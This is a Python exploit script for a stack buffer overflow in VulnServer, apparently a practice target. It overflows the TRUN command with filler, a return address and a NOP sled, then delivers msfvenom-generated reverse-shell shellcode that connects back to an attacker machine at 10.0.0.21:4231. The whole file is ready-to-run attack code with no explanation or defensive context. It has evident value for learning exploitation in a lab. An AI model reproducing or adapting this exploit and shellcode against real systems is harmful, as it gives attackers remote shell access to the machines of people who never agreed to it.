#!/etc/python
#Written By: Jb05s
#Purpose: VulnServer - Direct Return

import socket, sys, os

host = "10.0.0.26"
port = 9999

nop = "\x90" * 16

"""
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.21 LPORT=4231 -f c -b \x00
Payload size: 351 bytes
"""

sc = ("\xb8\x91\xf2\x55\x0e\xd9\xc7\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\x52\xf6\xb7\xfb\xa8\x1f\xb5"
"\x04\x50\xe0\xda\x8d\xb5\xd1\xda\xea\xbe\x42\xeb\x79\x92\x6e"
"\x80\x2c\x06\xe4\xe4\xf8\x29\x4d\x42\xdf\x04\x4e\xff\x23\x07"
"\xcc\x02\x70\xe7\xed\xcc\x85\xe6\x2a\x30\x67\xba\xe3\x3e\xda"
"\x2a\x87\x0b\xe7\xc1\xdb\x9a\x6f\x36\xab\x9d\x5e\xe9\xa7\xc7"
"\x40\x08\x6b\x7c\xc9\x12\x68\xb9\x83\xa9\x5a\x35\x12\x7b\x93"
"\xb6\xb9\x42\x1b\x45\xc3\x83\x9c\xb6\xb6\xfd\xde\x4b\xc1\x3a"
"\x9c\x97\x44\xd8\x06\x53\xfe\x04\xb6\xb0\x99\xcf\xb4\x7d\xed"
"\x97\xd8\x80\x22\xac\xe5\x09\xc5\x62\x6c\x49\xe2\xa6\x34\x09"
"\x8b\xff\x90\xfc\xb4\x1f\x7b\xa0\x10\x54\x96\xb5\x28\x37\xff"
"\x7a\x01\xc7\xff\x14\x12\xb4\xcd\xbb\x88\x52\x7e\x33\x17\xa5"
"\x81\x6e\xef\x39\x7c\x91\x10\x10\xbb\xc5\x40\x0a\x6a\x66\x0b"
"\xca\x93\xb3\x9c\x9a\x3b\x6c\x5d\x4a\xfc\xdc\x35\x80\xf3\x03"
"\x25\xab\xd9\x2b\xcc\x56\x8a\xd3\x1b\x59\x21\xbc\x19\x59\xa5"
"\xbb\x97\xbf\xaf\xd3\xf1\x68\x58\x4d\x58\xe2\xf9\x92\x76\x8f"
"\x3a\x18\x75\x70\xf4\xe9\xf0\x62\x61\x1a\x4f\xd8\x24\x25\x65"
"\x74\xaa\xb4\xe2\x84\xa5\xa4\xbc\xd3\xe2\x1b\xb5\xb1\x1e\x05"
"\x6f\xa7\xe2\xd3\x48\x63\x39\x20\x56\x6a\xcc\x1c\x7c\x7c\x08"
"\x9c\x38\x28\xc4\xcb\x96\x86\xa2\xa5\x58\x70\x7d\x19\x33\x14"
"\xf8\x51\x84\x62\x05\xbc\x72\x8a\xb4\x69\xc3\xb5\x79\xfe\xc3"
"\xce\x67\x9e\x2c\x05\x2c\xae\x66\x07\x05\x27\x2f\xd2\x17\x2a"
"\xd0\x09\x5b\x53\x53\xbb\x24\xa0\x4b\xce\x21\xec\xcb\x23\x58"
"\x7d\xbe\x43\xcf\x7e\xeb")

buffer = "\x41" * 2003 + "\xAF\x11\x50\x62" + nop + sc + "\x43" * (5000-2003-4-len(nop)-len(sc))

payload = "TRUN /.:/" + buffer

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((host,port))
exploit.send(payload)
exploit.close()
